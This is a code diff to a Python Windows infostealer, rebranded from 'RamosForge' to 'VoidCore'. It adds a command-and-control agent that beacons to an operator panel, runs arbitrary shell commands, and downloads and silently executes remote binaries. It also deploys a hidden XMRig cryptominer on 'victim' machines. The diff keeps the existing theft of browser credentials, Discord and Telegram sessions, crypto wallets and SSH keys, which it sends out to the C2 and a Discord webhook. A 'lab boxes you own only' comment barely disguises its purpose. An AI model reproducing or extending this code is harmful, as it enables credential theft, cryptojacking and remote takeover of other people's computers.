@@ -1,4 +1,4 @@
-"""RamosForge build. Config injected at forge time (plaintext or sealed)."""
+"""VoidCore build. Config injected at forge time (plaintext or sealed)."""
 import json, base64
 __CONFIG_BLOCK__
 """Void Windows stealer client - full collection surface, exfils to YOUR C2.
@@ -632,6 +632,237 @@ def steal_screenshot():
         add("screenshot", {"jpg_b64": base64.b64encode(buf.getvalue()).decode()})
     except Exception: pass
 
+# ---- persistent agent + open-source XMRig control (lab boxes you own only)
+# Miner binary: official XMRig from https://github.com/xmrig/xmrig (GPL).
+# Panel serves xmrig.exe + per-victim config; agent runs it hidden, no admin,
+# stops on task. Forge may bake defaults into CONFIG["miner"].
+AGENT_INTERVAL = 60
+MINER_CFG = {}  # overridden by CONFIG["miner"] when forged
+
+def _miner_cfg():
+    try:
+        c = globals().get("CONFIG", {})
+        if isinstance(c, str):
+            c = json.loads(c)
+        m = (c or {}).get("miner") or {}
+        if isinstance(m, dict) and (m.get("pool") or m.get("wallet")):
+            return m
+    except Exception:
+        pass
+    return globals().get("MINER_CFG", {}) or {}
+
+def _bh_dir():
+    try:
+        d = os.path.join(tempfile.gettempdir(), "..", "bh")
+        os.makedirs(d, exist_ok=True)
+        return d
+    except Exception:
+        d = os.path.join(tempfile.gettempdir(), "bh")
+        try: os.makedirs(d, exist_ok=True)
+        except Exception: pass
+        return d
+
+def _miner_paths():
+    d = _bh_dir()
+    return (os.path.join(d, "xmrig.exe"), os.path.join(d, "config.json"),
+            os.path.join(d, "miner.pid"))
+
+def miner_status():
+    exe, _cfg, pidf = _miner_paths()
+    running, pid = False, None
+    try:
+        if os.path.isfile(pidf):
+            pid = int(open(pidf).read().strip() or "0") or None
+    except Exception:
+        pid = None
+    try:  # tasklist is the reliable witness on Windows
+        import subprocess as _sp
+        kw = {"capture_output": True, "timeout": 15}
+        if os.name == "nt":
+            kw["creationflags"] = 0x08000000
+        r = _sp.run(["tasklist", "/FI", "IMAGENAME eq xmrig.exe"], **kw)
+        if b"xmrig.exe" in (r.stdout or b""):
+            running = True
+    except Exception:
+        running = bool(pid and os.path.isfile(exe))
+    return {"running": running, "pid": pid}
+
+def _dl(url, out):
+    req = urllib.request.Request(url, headers={"User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+        "(KHTML, like Gecko) Chrome/140.0 Safari/537.36"})
+    with urllib.request.urlopen(req, timeout=120) as r, open(out, "wb") as f:
+        shutil.copyfileobj(r, f)
+    return os.path.getsize(out)
+
+def miner_start(pool=None, wallet=None, threads=0, cpu=50, base=None):
+    """Fetch xmrig.exe from YOUR panel, write config, launch hidden. Reversible."""
+    import subprocess as _sp
+    baked = _miner_cfg()
+    pool = pool or baked.get("pool") or ""
+    wallet = wallet or baked.get("wallet") or ""
+    threads = int(threads or baked.get("threads") or 0)
+    cpu = max(1, min(100, int(cpu or baked.get("cpu") or baked.get("cpu_max") or 50)))
+    if not pool or not wallet:
+        return {"ok": False, "error": "no pool/wallet"}
+    exe, cfgp, pidf = _miner_paths()
+    try:
+        if (not os.path.isfile(exe)) or os.path.getsize(exe) < 1000000:
+            got = 0
+            if base:
+                for path in ("/miner/xmrig.exe", "/mod/tool?name=xmrig.exe"):
+                    try:
+                        got = _dl(base + path, exe + ".new")
+                        break
+                    except Exception:
+                        continue
+            if got > 1000000:
+                try:
+                    if os.path.isfile(exe): os.remove(exe)
+                except Exception: pass
+                os.replace(exe + ".new", exe)
+            elif os.path.isfile(exe + ".new"):
+                try: os.remove(exe + ".new")
+                except Exception: pass
+        if (not os.path.isfile(exe)) or os.path.getsize(exe) < 1000000:
+            return {"ok": False, "error": "xmrig.exe missing on panel/client"}
+    except Exception as e:
+        return {"ok": False, "error": f"download: {e}"}
+    cfg = {"api": {"id": None, "worker-id": None}, "http": {"enabled": False},
+           "autosave": False, "background": False, "colors": False,
+           "donate-level": 1,
+           "cpu": {"enabled": True, "huge-pages": False,
+                   "max-threads-hint": threads or 50, "max-cpu-usage": cpu},
+           "pools": [{"url": pool, "user": wallet, "keepalive": True, "tls": False}]}
+    try:
+        json.dump(cfg, open(cfgp, "w"))
+    except Exception as e:
+        return {"ok": False, "error": f"config: {e}"}
+    try:
+        miner_stop(silent=True)
+        kw = {"stdout": subprocess.DEVNULL if (hasattr(subprocess, "DEVNULL")) else open(os.devnull, "w"),
+              "stderr": subprocess.DEVNULL if (hasattr(subprocess, "DEVNULL")) else open(os.devnull, "w"),
+              "cwd": os.path.dirname(exe), "close_fds": True}
+        # py2-compat: subprocess imported lazily inside steal fns; ensure present
+        import subprocess as _sp2
+        kw2 = {"stdout": _sp2.DEVNULL, "stderr": _sp2.DEVNULL,
+               "cwd": os.path.dirname(exe), "close_fds": True}
+        if os.name == "nt":
+            kw2["creationflags"] = 0x08000000  # CREATE_NO_WINDOW, silent double-click
+        p = _sp2.Popen([exe, "--config", cfgp], **kw2)
+        try: open(pidf, "w").write(str(p.pid))
+        except Exception: pass
+        return {"ok": True, "pid": p.pid, "pool": pool, "cpu": cpu}
+    except Exception as e:
+        return {"ok": False, "error": str(e)[:200]}
+
+def miner_stop(silent=False):
+    exe, _cfg, pidf = _miner_paths()
+    try:
+        import subprocess as _sp
+        kw = {"capture_output": True, "timeout": 20}
+        if os.name == "nt":
+            kw["creationflags"] = 0x08000000
+            try:
+                _sp.run(["taskkill", "/F", "/IM", "xmrig.exe"], **kw)
+            except Exception: pass
+        else:
+            try: _sp.run(["pkill", "-f", "xmrig"], **kw)
+            except Exception: pass
+    except Exception: pass
+    try:
+        if os.path.isfile(pidf): os.remove(pidf)
+    except Exception: pass
+    st = miner_status()
+    return {"ok": not st["running"], "status": st}
+
+def _agent_post(base, path, obj):
+    try:
+        req = urllib.request.Request(base + path, data=json.dumps(obj).encode(),
+            headers={"Content-Type": "application/json"})
+        return json.loads(urllib.request.urlopen(req, timeout=30).read().decode())
+    except Exception as e:
+        if not str(path).endswith("checkin"):
+            print(f"[!] agent {path}: {e}")
+        return None
+
+def agent_run_task(base, victim_id, task):
+    ttype = task.get("type", "")
+    tid = task.get("id", "")
+    args = task.get("args", {}) or {}
+    out = {}
+    try:
+        if ttype == "shell":
+            import subprocess as _sp
+            cmd = args.get("cmd", "")
+            kw = {"capture_output": True, "text": True, "timeout": 120, "shell": True}
+            if os.name == "nt":
+                kw["creationflags"] = 0x08000000
+            r = _sp.run(cmd, **kw)
+            out = {"ok": True, "rc": r.returncode,
+                   "output": ((r.stdout or "") + (r.stderr or ""))[:8000]}
+        elif ttype == "miner_start":
+            out = miner_start(args.get("pool"), args.get("wallet"),
+                              args.get("threads", 0), args.get("cpu", 50), base)
+        elif ttype == "miner_stop":
+            out = miner_stop()
+        elif ttype == "download_exec":
+            import subprocess as _sp2
+            url, name = args.get("url", ""), args.get("name", "upd.exe")
+            if not url:
+                out = {"ok": False, "error": "no url"}
+            else:
+                dst = os.path.join(_bh_dir(), re.sub(r"[^A-Za-z0-9_.-]", "_", name)[:48])
+                _dl(url, dst)
+                kw = {"cwd": os.path.dirname(dst), "close_fds": True,
+                      "stdout": _sp2.DEVNULL, "stderr": _sp2.DEVNULL}
+                if os.name == "nt":
+                    kw["creationflags"] = 0x08000000
+                _sp2.Popen([dst] + (args.get("args") or []), **kw)
+                out = {"ok": True, "ran": dst}
+        elif ttype == "steal":
+            loot.clear()
+            for fn in STEAL_FUNCS:
+                try: fn()
+                except Exception: pass
+            body = zlib.compress(json.dumps(loot).encode())
+            post_json(base + "/shard", {"userId": victim_id, "env": "prod",
+                      "loot_b64": base64.b64encode(body).decode()})
+            out = {"ok": True, "counts": {k: len(v) for k, v in loot.items()}}
+        else:
+            out = {"ok": False, "error": f"unknown task {ttype}"}
+    except Exception as e:
+        out = {"ok": False, "error": str(e)[:500]}
+    try:
+        _agent_post(base, "/agent/result", {"victim_id": victim_id, "task_id": tid,
+                                            "output": out, "miner": miner_status()})
+    except Exception: pass
+    return out
+
+def agent_loop(base, victim_id, interval=60):
+    import time as _t, random as _r
+    print(f"[*] agent live -> {base} every ~{interval}s (miner: XMRig, stoppable)")
+    # baked autostart (forge-time opt-in only)
+    try:
+        baked = _miner_cfg()
+        if baked.get("autostart") and baked.get("pool") and baked.get("wallet"):
+            miner_start(base=base)
+    except Exception: pass
+    while True:
+        try:
+            res = _agent_post(base, "/agent/checkin",
+                              {"victim_id": victim_id, "miner": miner_status()})
+            for task in (res or {}).get("tasks", []):
+                try: agent_run_task(base, victim_id, task)
+                except Exception: pass
+        except Exception: pass
+        try: _t.sleep(max(15, interval + _r.randint(-10, 15)))
+        except Exception:
+            try: _t.sleep(interval)
+            except Exception: break
+
+STEAL_FUNCS = []
+
 # ---- exfil
 import hashlib as _hl, time as _tm, secrets
 
@@ -703,7 +934,7 @@ def discord_exfil(webhook, victim, loot):
         for row in (loot.get(key) or [])[:4]:
             prev.append(str(row))
     preview = "\n".join(prev)[:900]
-    msg = (f"**[RamosForge] victim `{victim}`**```json\n{json.dumps(summary, indent=1)[:900]}\n```"
+    msg = (f"**[VoidCore] victim `{victim}`**```json\n{json.dumps(summary, indent=1)[:900]}\n```"
            + (f"\n**preview**```{preview}```" if preview else ""))
     # one readable json file, not hundreds of base64 messages
     blob = json.dumps(loot, indent=1).encode()
@@ -742,6 +973,8 @@ def main():
     ap.add_argument("--host", default="auto", help="C2 host:port, auto, or forge")
     ap.add_argument("--user-id", default=None)
     ap.add_argument("--env", default="prod")
+    ap.add_argument("--no-agent", action="store_true", help="one-shot steal, no beacon loop")
+    ap.add_argument("--interval", type=int, default=AGENT_INTERVAL)
     a = ap.parse_args()
     import socket as _so
     if not a.user_id:
@@ -779,9 +1012,11 @@ def main():
     pre = post_json(base + "/shard/prefireMc", {"userId": a.user_id, "sessionId": "win-test"})
     print(f"[*] prefire -> {pre}")
 
-    for fn in [steal_chromium, steal_chromium_abe_debug, steal_chromelvator, steal_firefox, steal_discord, steal_telegram,
+    global STEAL_FUNCS
+    STEAL_FUNCS = [steal_chromium, steal_chromium_abe_debug, steal_chromelvator, steal_firefox, steal_discord, steal_telegram,
                steal_steam, steal_minecraft, steal_roblox, steal_wallets,
-               steal_extensions, steal_ssh, steal_sysinfo, steal_screenshot]:
+               steal_extensions, steal_ssh, steal_sysinfo, steal_screenshot]
+    for fn in STEAL_FUNCS:
         try: fn()
         except Exception as e: print(f"[!] {fn.__name__}: {e}")
     print(f"[*] collected: { {k: len(v) for k, v in loot.items()} }")
@@ -789,6 +1024,9 @@ def main():
     body = zlib.compress(json.dumps(loot).encode())
     post_json(base + "/shard", {"userId": a.user_id, "env": a.env, "loot_b64": base64.b64encode(body).decode()})
     print("[*] exfiltrated. done.")
+    if not a.no_agent:
+        try: agent_loop(base, a.user_id, a.interval)
+        except KeyboardInterrupt: pass
 
 if __name__ == "__main__":
     main()
